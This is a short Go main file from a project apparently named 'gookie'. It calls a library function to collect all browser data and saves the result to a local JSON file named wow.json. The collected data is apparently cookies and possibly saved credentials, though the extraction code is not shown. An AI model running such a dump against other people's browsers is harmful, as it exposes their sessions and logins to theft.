package main

import (
	"gookie/pkg/browser"
	"gookie/pkg/utils"
)

func main() {
	data, err := browser.GetAllBrowserData()
	if err != nil {
		panic(err)
	}

	err = utils.JSONSaver(data, "wow.json")
	if err != nil {
		panic(err)
	}
}
